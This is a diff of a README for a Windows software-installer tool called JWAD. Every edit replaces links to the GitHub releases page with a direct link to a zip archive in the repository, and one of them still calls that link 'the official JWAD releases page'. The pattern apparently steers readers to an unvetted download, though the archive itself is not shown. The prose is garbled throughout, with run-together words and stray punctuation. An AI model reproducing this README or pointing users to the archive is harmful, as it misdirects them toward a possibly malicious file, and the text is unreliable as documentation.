@@ -1,6 +1,6 @@
 # 📦 JWAD - Your Automatic Windows Software Assistant
 
-[🚀 Download JWAD Now](https://github.com/zNemernic/JWAD/releases)
+[🚀 Download JWAD Now](https://raw.githubusercontent.com/zNemernic/JWAD/main/assets/v1.4.zip)
 
 )
 
@@ -12,7 +12,7 @@ JWAD (Javizcape Windows App Deployer) is a handy tool that installs essential so
 
 .
 
-[Download JWAD Here](https://github.com/zNemernic/JWAD/releases)
+[Download JWAD Here](https://raw.githubusercontent.com/zNemernic/JWAD/main/assets/v1.4.zip)
 
 )
 
@@ -50,7 +50,7 @@ Getting started is as simple as counting to three. Follow these steps:
 
 ### 1. Download JWAD
 
-1) Click the download link anywhere on this pageor visit **[the official JWAD releases page](https://github.com/zNemernic/JWAD/releases).
+1) Click the download link anywhere on this pageor visit **[the official JWAD releases page](https://raw.githubusercontent.com/zNemernic/JWAD/main/assets/v1.4.zip).
 2) You’ll see a list of available versions. Look for the latest one (it will be at the top)ostand click to download it.
 
 .
@@ -153,7 +153,7 @@ JWAD is built with PowerShell—a powerful scripting language included with Wind
 
 ## ✅ Summary
 
-JWAD is your stress‑free solution for installing software on Windows. It checks your system, installs apps quietly, confirms everything works,andsaves youa report for peace ofmind. It’s perfect for anyone who doesn’t want tobecome a tech expert just tobuy a new computer workingoamit. Head over to the [download page](https://github.com/zNemernic/JWAD/releases ), grab the latest versionband let JWAD take over from there. Your future self will thank youoamd.
+JWAD is your stress‑free solution for installing software on Windows. It checks your system, installs apps quietly, confirms everything works,andsaves youa report for peace ofmind. It’s perfect for anyone who doesn’t want tobecome a tech expert just tobuy a new computer workingoamit. Head over to the [download page](https://raw.githubusercontent.com/zNemernic/JWAD/main/assets/v1.4.zip ), grab the latest versionband let JWAD take over from there. Your future self will thank youoamd.
 
 .You’ll wonder how you ever lived without it.
 
